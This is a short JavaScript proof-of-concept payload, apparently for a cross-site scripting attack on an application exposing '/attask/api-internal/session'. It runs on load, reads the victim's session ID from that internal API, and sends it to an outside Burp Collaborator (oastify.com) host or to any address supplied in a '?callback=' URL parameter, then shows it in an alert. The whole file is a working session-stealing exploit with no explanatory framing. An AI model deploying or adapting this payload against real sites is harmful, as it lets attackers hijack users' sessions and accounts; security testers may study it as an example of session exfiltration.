function getQueryParam(name) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(name);
}

async function stealSessionID() {
    // Step 1: Get session ID from internal API
    const response = await fetch('/attask/api-internal/session', {
        method: 'GET',
        headers: {
            'Content-Type': 'application/json'
        },
    });

    const data = await response.json();
    const sessionID = data.data.sessionID;

    // Step 2: Default exfiltration URL
    let targetUrl = "fatywcowa7okcmahb4js0ts3eukl8lwa.oastify.com";

    // Step 3: Check for ?callback= parameter in the current URL
    const callbackParam = getQueryParam("callback");
    if (callbackParam) {
        targetUrl = callbackParam;
    }

    // Step 4: Send session ID to the chosen endpoint
    const secondResponse = await fetch(`${targetUrl}?session=${sessionID}`, {
        method: 'GET',
        headers: {
            'Content-Type': 'application/json'
        },
    });

    const secondData = await secondResponse.json();

    console.log("Second fetch data:", secondData);

    alert(sessionID);

    return {
        sessionID,
        secondData
    };
}

stealSessionID();